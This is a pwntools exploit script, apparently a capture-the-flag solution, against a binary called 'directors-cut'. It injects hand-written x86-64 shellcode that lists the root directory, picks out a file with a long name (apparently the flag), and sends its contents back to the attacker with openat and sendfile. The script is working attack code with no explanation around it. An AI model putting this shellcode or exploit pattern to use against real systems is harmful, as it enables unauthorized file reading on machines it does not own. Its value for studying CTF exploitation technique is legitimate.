#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./directors-cut"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
	) if args.REMOTE else process([exe], aslr=True)
if args.GDB: gdb.attach(io, """
	b *0x13370049
""")

PAGE_ADDR = 0x13370000

shellcode = asm(f"""            
	/* openat(0, "/", 0, 0) */
	mov rsi, 0x002F
	/* store / */
	mov r10, {PAGE_ADDR}
	movq [r10], rsi
	lea rsi, [r10]
	mov rax, 0x101
	syscall

	/* getdents64 */
	mov rdi, rax /* dfd */
	mov rsi, {PAGE_ADDR+0x800}
	mov rdx, 0x1000 /* sz */
	mov rax, 0xD9
	syscall

_parse:
	/* do the parsing of each entry */
	mov rdi, [rsi+0x10] /* since d_reclen is a short, we need the last two bytes, but in our case, only keeping the last byte works. */
	lea r14, [rsi+0x13] /* r14 = d_name */
	xor rbx, rbx
	mov bl, dil		    /* rbx = d_reclen */

	/* check if > 0x28 */
	cmp bl, 0x28
	jg _found

	add rsi, rbx /* addr += rbx */
	jmp _parse

_found:
	/* r14 is now d_name, we need to append "/" */
	mov bl, 0x2F
	movb [r14-1], bl
	dec r14

	/* use openat and sendfile */
	xor rdi, rdi
	mov rsi, r14
	xor rdx, rdx
	xor r10, r10
	mov rax, 0x101
	syscall

	/* sendfile */
	mov rdi, 0x1
	mov rsi, rax
	xor rdx, rdx
	mov r10, 0x100
	mov rax, 0x28
	syscall
    
    /* exit */
    mov rax, 0x3c
    syscall
""")

io.sendlineafter(b"shellcode: ", shellcode)

io.interactive()
